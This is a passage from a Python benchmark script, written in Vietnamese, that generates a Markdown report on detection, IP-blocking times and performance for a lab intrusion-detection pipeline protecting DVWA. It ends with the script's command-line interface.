        L.append("\"Tới được ứng dụng\" = request không bị cả Cổng 2 chặn (DVWA trả 200/302/404). Với SQLi, phần lớn "
                 "request đã bị CRS chặn ở Cổng 2 ngay từ đầu; Cổng 1 chặn hẳn IP để các request sau không tới Apache nữa.")
        L.append("")
        L.append("Chi tiết từng lần:")
        L.append("")
        tr = []
        for t in D["mttr"]:
            i = trial_info(t, D["dec"])
            tr.append([t["scenario"], t["rep"], t["ip"], "có" if t["blocked"] else "**không**", num(i["total"]),
                       num(i["decide"]), num(i["enforce"]), i["passed_g1"], i["reached_app"],
                       i["counted"] if i["blk"] and i["blk"]["reason"] != "immediate:behaviour" else "—",
                       i["dup"], i["by"]])
        L += table(["Kịch bản", "Lần", "IP", "Bị chặn", "T tổng", "T quyết định", "T thực thi", "Qua Cổng 1",
                    "Tới ứng dụng", "Cảnh báo được đếm", "Trùng cảm biến (bỏ)", "Quyết định bởi"], tr)
        L.append("")
        S.append("**Thời gian chặn IP (trung vị):** " + "; ".join(sm) + ".")

    # ---------- 5. rải rác ----------
    L.append("## 5. Tấn công rải rác dưới ngưỡng ngắn — ca B5 (pha slow)")
    L.append("")
    if not D["slow"]:
        L += ["Không chạy pha này.", ""]
    else:
        t = D["slow"][0]
        i = trial_info(t, D["dec"])
        L.append(f"Một IP ({t['ip']}) gửi 1 SQLi mỗi {num(t['interval'], 0)} s: tối đa 4 cảnh báo trong 60 s nên "
                 f"không bao giờ chạm ngưỡng ngắn; chỉ cửa sổ dài (24 giờ) chặn được.")
        L.append("")
        L += table(["Kết quả", "Request đã gửi", "Cảnh báo được đếm khi chặn", "Trùng cảm biến (bỏ)",
                    "Quyết định chặn lúc (s)", "Request đầu tiên bị Cổng 1 chặn", "Quyết định bởi"],
                   [["bị chặn" if t["blocked"] else f"**không bị chặn** trong {num(t['timeout'], 0)} s", t["n_sent"],
                     i["counted"] if i["blk"] else "—", i["dup"], num(i["decide"]),
                     f"thứ {t['n_sent']} ({num(i['total'])} s)" if t["blocked"] else "—", i["by"]]])
        L.append("")
        L.append(f"Thời điểm tính từ request đầu tiên. Request gửi cách nhau {num(t['interval'], 0)} s nên thời điểm "
                 "\"bị Cổng 1 chặn\" chỉ chính xác tới một khoảng gửi; thời điểm quyết định (theo nhật ký responder) "
                 "mới phản ánh tốc độ của hệ thống.")
        L.append("")
        if t["blocked"] and i["blk"] and i["blk"]["reason"] == "threshold":
            L.append("**Chú ý:** IP bị chặn bởi ngưỡng NGẮN dù chỉ gửi tối đa 4 request mỗi phút — tức là một request "
                     "đã bị đếm nhiều lần (khử trùng lặp giữa hai cảm biến không có tác dụng).")
            L.append("")
        S.append("**Tấn công rải rác (B5):** " + (
            f"bị chặn khi đủ {i['counted']} cảnh báo, quyết định lúc {num(i['decide'])} s sau request đầu tiên "
            f"(bởi {i['by']}); request thứ {t['n_sent']} là request đầu tiên bị Cổng 1 chặn."
            if t["blocked"] and i["blk"] else
            f"bị chặn ở request thứ {t['n_sent']} ({num(i['total'])} s)." if t["blocked"]
            else f"không bị chặn trong {num(t['timeout'], 0)} s."))

    # ---------- 6. hiệu năng ----------
    L.append("## 6. Hiệu năng (pha perf)")
    L.append("")
    if not D["perf"]:
        L += ["Không chạy pha này.", ""]
    else:
        L.append("Độ trễ đo ở phía client, gồm cả hai cổng (nginx → Apache + ModSecurity/CRS → DVWA/PHP), mỗi request "
                 "một kết nối TCP mới. IP đo được miễn trừ tạm thời nên không bị chặn giữa chừng.")
        L.append("")
        by_l = defaultdict(list)
        for r in D["perf"]:
            by_l[r["label"]].append(r)
        tr, sm = [], {}
        for lab, rs in by_l.items():
            lat = [x for r in rs for x in r["lat"]]
            gates = Counter(); stt = Counter()
            for r in rs:
                gates.update(r["gates"]); stt.update(r["statuses"])
            n = sum(gates.values())
            dur = max(r["t_end"] for r in rs) - min(r["t_start"] for r in rs)
            rps = n / dur if dur > 0 else None
            errs = gates.get("error", 0) + gates.get("limit", 0) + gates.get("http5xx", 0)
            tr.append([lab, sum(r["conc"] for r in rs), n, num(rps), num(pctl(lat, 50)), num(pctl(lat, 95)),
                       num(pctl(lat, 99)), num(max(lat) if lat else None),
                       ", ".join(f"{k}: {v}" for k, v in sorted(stt.items())), errs])
            sm[lab] = (rps, pctl(lat, 50), pctl(lat, 95), sum(r["conc"] for r in rs))
        L += table(["Mức tải", "Kết nối đồng thời", "Request", "Thông lượng (req/s)", "p50 (ms)", "p95 (ms)",
                    "p99 (ms)", "max (ms)", "Mã HTTP", "Lỗi / 429"], tr)
        L.append("")
        dr = D["drain"]
        if dr:
            if dr["lag_s"] is not None:
                lag = (f"ghi đủ {dr['final']}/{dr['expected']} sự kiện vào Elasticsearch sau **{num(dr['lag_s'])} s** "
                       f"kể từ khi ngừng tải")
                if dr["first_sample_s"] is not None and dr["lag_s"] <= dr["first_sample_s"] + 0.01:
                    lag += " (đã đủ ngay ở lần đếm đầu tiên — độ trễ thật còn nhỏ hơn)"
            else:
                lag = f"chỉ ghi được {dr['final']}/{dr['expected']} sự kiện, chưa đủ khi hết thời gian chờ"
            L.append(f"**Độ trễ pipeline** (Filebeat → Kafka → classifier → Elasticsearch): {lag}.")
            L.append("")
        if D["st_idle"] or D["st_load"]:
            idle = {s.get("Name"): s for s in D["st_idle"]}
            load = {s.get("Name"): s for s in D["st_load"]}
            names = sorted(set(idle) | set(load))
            tr = []
            tot = [0.0, 0.0, 0.0, 0.0]
            for nm in names:
                a_, b_ = idle.get(nm, {}), load.get(nm, {})
                vals = [parse_pct(a_.get("CPUPerc")), parse_pct(b_.get("CPUPerc")),
                        parse_mem(a_.get("MemUsage")), parse_mem(b_.get("MemUsage"))]
                for k, v in enumerate(vals):
                    tot[k] += v or 0
                short = re.sub(r"^nsm-|-\d+$", "", nm or "?")
                tr.append([short] + [num(vals[0]), num(vals[1]), num(vals[2], 0), num(vals[3], 0)])
            tr.append(["**tổng**", num(tot[0]), num(tot[1]), num(tot[2], 0), num(tot[3], 0)])
            L.append("**Tài nguyên** (`docker stats`, lúc nghỉ và giữa mức tải 32 kết nối; CPU tính theo % một lõi):")
            L.append("")
            L += table(["Container", "CPU nghỉ (%)", "CPU khi tải (%)", "RAM nghỉ (MiB)", "RAM khi tải (MiB)"], tr)
            L.append("")
        parts = []
        ben_lv = [v for k, v in sm.items() if "tấn công" not in k and v[0] is not None]
        one = next((v for v in ben_lv if v[3] == 1), None)
        best = max(ben_lv, key=lambda v: v[0], default=None)
        top = max(ben_lv, key=lambda v: v[3], default=None)
        if one:
            parts.append(f"1 kết nối p50 {num(one[1])} ms")
        if best:
            parts.append(f"thông lượng cao nhất {num(best[0], 0)} req/s (ở {best[3]} kết nối)")
        if top and top is not one and top is not best:
            parts.append(f"ở {top[3]} kết nối còn {num(top[0], 0)} req/s, p95 {num(top[2])} ms")
        if dr and dr["lag_s"] is not None:
            parts.append(f"pipeline ghi kịp sau {num(dr['lag_s'])} s")
        S.append("**Hiệu năng:** " + "; ".join(parts) + ".")

    # ---------- ráp ----------
    H = [f"# Benchmark hệ thống NSM — lần chạy {run}", "",
         "Sinh tự động bởi `tools/bench.sh`. Dữ liệu thô (.json) nằm cùng thư mục với báo cáo này.", "",
         "## 1. Tóm tắt", ""]
    H += [f"- {s}" for s in S] or ["- (không có pha nào chạy)"]
    H += ["", "## 2. Môi trường và cấu hình", "", "```", D["env"] or "(không có env.txt)", "```", ""]
    T = ["## 7. Cách đọc và giới hạn của phép đo", "",
         "- Số đo trên lab Docker một máy: giá trị tuyệt đối phụ thuộc phần cứng. Dùng để so sánh các lần chạy "
         "trên cùng một máy (trước/sau khi đổi cấu hình hay huấn luyện lại model), không phải con số sản phẩm.",
         "- DVWA chưa đăng nhập nên các trang lỗ hổng trả 302; payload vẫn đi qua đủ hai cổng và được phân loại, "
         "chỉ là không chạm tới mã dễ tổn thương.",
         "- Trong lúc đo, dải 10.10.10.192/27 (pha detect và perf) được thêm tạm vào danh sách miễn trừ của "
         "responder để không bị chặn giữa chừng; các pha mttr/slow dùng IP ngoài dải này nên đi đúng luồng thật. "
         "Cấu hình gốc được khôi phục khi kết thúc.",
         "- T tổng và T thực thi chỉ chính xác tới khoảng cách giữa hai request của kịch bản (0,5 s với sqli/rce, "
         "0,1 s với recon, gần như liên tục với flood): lệnh chặn có hiệu lực giữa hai request thì phải chờ tới "
         "request kế tiếp mới thấy. T quyết định lấy từ nhật ký responder nên không bị ảnh hưởng.",
         "- T thực thi có thể dài hơn khi hai lệnh chặn xảy ra sát nhau: nginx nạp lại danh sách chặn tối đa "
         "một lần mỗi `RELOAD_MIN_INTERVAL_S` giây.",
         "- Bộ mẫu phát hiện nhỏ và cố định; KTC 95 % trong mục 3 cho biết mức bất định. Hai model chưa được huấn luyện "
         "lại (xem `Bao-cao-sua-loi-NSM.md`), nên tỉ lệ báo nhầm của tầng 2 trên văn bản \"khó\" là hạn chế đã biết.",
         "- Lưu lượng tấn công của bench có thể được rulegen gom thành luật tự sinh (sau thời gian shadow). "
         "Chạy `bash tools/reset-all.sh` trước khi trình diễn.", ""]
    print("\n".join(H + L + T))


# =====================================================================
def main():
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--ip", default="?")
    ap.add_argument("--run", default="manual")
    sub = ap.add_subparsers(dest="cmd", required=True)
    sub.add_parser("check")
    p = sub.add_parser("detect"); p.add_argument("--set", choices=("attack", "benign"), required=True)
    p.add_argument("--gap", type=float, default=0.05)
    p = sub.add_parser("mttr"); p.add_argument("--scenario", required=True,
                                               choices=("sqli", "rce", "flood", "recon", "slow"))
    p.add_argument("--rep", type=int, default=1); p.add_argument("--interval", type=float)
    p.add_argument("--timeout", type=float); p.add_argument("--max-req", type=int, default=5000)
    p = sub.add_parser("perf"); p.add_argument("--label", required=True); p.add_argument("--conc", type=int, default=1)
    p.add_argument("--duration", type=float, default=15); p.add_argument("--kind", choices=("benign", "attack"),
                                                                         default="benign")
    sub.add_parser("collect-detect"); sub.add_parser("collect-decisions")
    p = sub.add_parser("drain"); p.add_argument("--timeout", type=float, default=300)
    p = sub.add_parser("report"); p.add_argument("--dir", default="/out")
    a = ap.parse_args()
    {"check": cmd_check, "detect": cmd_detect, "mttr": cmd_mttr, "perf": cmd_perf,
     "collect-detect": cmd_collect_detect, "collect-decisions": cmd_collect_decisions,
     "drain": cmd_drain, "report": cmd_report}[a.cmd](a)


if __name__ == "__main__":
    main()
